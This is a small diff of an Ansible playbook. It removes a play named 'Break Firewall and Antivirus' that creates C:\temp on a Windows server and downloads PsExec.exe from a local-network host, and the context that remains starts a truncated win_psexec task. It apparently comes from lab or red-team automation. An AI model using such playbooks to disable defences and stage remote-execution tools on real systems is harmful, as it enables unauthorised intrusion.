@@ -1,16 +1,3 @@
--
-  name: Break Firewall and Antivirus
-  hosts: windows-server
-  tasks:
-    - name: Creates directory
-      win_file:
-          path: C:\temp\
-          state: directory
-
-    - name: Get Executable from the host
-      win_get_url:
-        url: http://192.168.13.129/temp/PsExec.exe
-        dest: C:\temp\PsExec.exe
     -
       name:  Powershell scripties
       win_psexec:
